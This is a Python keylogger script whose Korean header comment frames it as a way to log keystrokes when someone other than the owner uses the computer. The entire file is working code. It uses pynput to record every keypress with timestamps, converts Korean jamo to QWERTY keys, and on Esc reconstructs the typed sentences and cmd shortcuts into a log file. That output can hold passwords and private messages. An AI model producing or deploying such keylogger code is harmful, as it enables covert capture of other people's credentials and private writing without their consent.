# 주인 외에 다른 사람이 컴퓨터 무단 이용 시, 키보드 로그를 저장.

import re
from decouple import config
from datetime import datetime
from pynput.keyboard import Key, Listener

RAW_DATA = config("RAW_DATA")
LOG_FILE = config("LOG_FILE")
KOR_TO_ENG = {
    "ㄱ":"r","ㄲ":"R","ㄴ":"s","ㄷ":"e","ㄸ":"E","ㄹ":"f","ㅁ":"a","ㅂ":"q","ㅃ":"Q",
    "ㅅ":"t","ㅆ":"T","ㅇ":"d","ㅈ":"w","ㅉ":"W","ㅊ":"c","ㅋ":"z","ㅌ":"x","ㅍ":"v",
    "ㅎ":"g","ㅏ":"k","ㅐ":"o","ㅑ":"i","ㅒ":"O","ㅓ":"j","ㅔ":"p","ㅕ":"u","ㅖ":"P",
    "ㅗ":"h","ㅘ":"hk","ㅙ":"ho","ㅚ":"hl","ㅛ":"y","ㅜ":"n","ㅝ":"nj",
    "ㅞ":"np","ㅟ":"nl","ㅠ":"b","ㅡ":"m","ㅢ":"ml","ㅣ":"l"
}

def write_logs(message: str):
    with open(RAW_DATA, 'a', encoding='utf-8') as file:
        file.write(message + '\n')
def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        char = key.char
        if not char:
            return 
        if char in KOR_TO_ENG:
            char = KOR_TO_ENG[char]
        log = f"[{timestamp}]: {char} "
    except AttributeError:
        log = f"[{timestamp}]: {key}"
    write_logs(log)

def on_release(key):
    if key == Key.esc:
        write_logs("============ 키 로깅 종료 ============")
        reconstruct_logs()
        return False

def reconstruct_logs():
    buffer = []
    upload_logs = []
    current_sentence_time = None
    cmd_active = False

    with open(RAW_DATA, 'r', encoding='utf-8') as file:
        for line in file:
            # 공백 제거
            line = line.strip()
            # time_stamp는 [YYYY-MM-DD HH:MM:SS] 이렇게 생김
            time_match = re.search(r"\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]", line)
            # 대괄호 제거
            time_stamp = time_match.group(1) if time_match else None
            
            # Backspace 눌렸을 시:
            if "Key.backspace" in line:
                if buffer:
                    buffer.pop()
                continue
            
            # Space 눌렸을 시:
            if "Key.space" in line:
                if not buffer and time_stamp:
                    current_sentence_time = time_stamp
                buffer.append(" ")
                continue
            
            # Enter 입력 시:
            if "Key.enter" in line:
                if buffer:
                    upload_logs.append(f"[{current_sentence_time}]: {''.join(buffer)}")
                    buffer = []
                    current_sentence_time = None
                continue
            
            # 명령어 사용 (CMD) 입력 시:
            if "Key.cmd" in line:
                cmd_active = True
                continue

            # shift / caps lock은 무시
            if any(keyword in line for keyword in ['Key.caps_lock', 'Key.shift']):
                continue

            # 입력한 문자를 추출
            match = re.search(r":\s(.+)$", line)
            if not match:
                continue
            char = match.group(1)

            if cmd_active:
                command = char.replace('Key.', "")
                upload_logs.append(f"[{time_stamp}]: cmd+{command}")
                cmd_active = False
                continue
        
            if not char.startswith('Key.'):
                if not buffer and time_stamp:
                    current_sentence_time = time_stamp
                buffer.append(char)
        if buffer:
            upload_logs.append(f"[{current_sentence_time}]: {''.join(buffer)}")

        with open(LOG_FILE, 'w', encoding='utf-8') as file:
            file.write("\n".join(upload_logs))

if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()